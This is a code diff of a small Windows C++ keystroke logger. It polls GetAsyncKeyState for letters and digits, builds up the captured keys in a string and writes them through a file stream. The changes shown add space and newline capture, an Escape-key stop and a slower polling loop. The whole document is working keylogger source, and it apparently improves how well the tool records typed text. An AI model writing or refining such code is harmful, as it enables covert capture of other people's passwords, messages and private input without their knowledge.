@@ -1,15 +1,17 @@
 #include <windows.h>
 #include <fstream>
-#include <string>
 #include <sstream>
+#include <iostream>
 
 using namespace std;
 
 string input;
 string stringKey;
-int counter;
+int counter = { 0 };
 ofstream output;
-stringstream sstream;
+boolean pEnd = { false };
+boolean lastSpace = { true };
+boolean lastReturn = { true };
 
 void keys(char keys);
 void flushString();
@@ -18,7 +20,7 @@ int main() {
 
 	char chars[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890" };
 
-	while (true)
+	while (!pEnd) 
 	{
 		for (int i = 0; i < 36; i++)
 		{
@@ -30,7 +32,7 @@ int main() {
 			flushString();
 		}
 
-		Sleep(50);
+		Sleep(120);
 	}
 
 	return 0;
@@ -40,12 +42,28 @@ void keys(char key)
 {
 	if (GetAsyncKeyState(key))
 	{
-		sstream << key;
-		sstream >> stringKey;
-		input.append(stringKey);
+		string sKey(1, key);
+		input.append(sKey);
 		counter++;
 		stringKey = "";
+		lastSpace = false;
+		lastReturn = false;
 	}
+
+	if (GetAsyncKeyState(VK_ESCAPE)) {
+		pEnd = true;
+	}
+
+	if (GetAsyncKeyState(VK_SPACE) && !lastSpace) {
+		input.append(" ");
+		lastSpace = true;
+	}
+
+	if (GetAsyncKeyState(VK_RETURN) && !lastReturn) {
+		input.append("\n");
+		lastReturn = true;
+	}
+
 }
 
 void flushString()
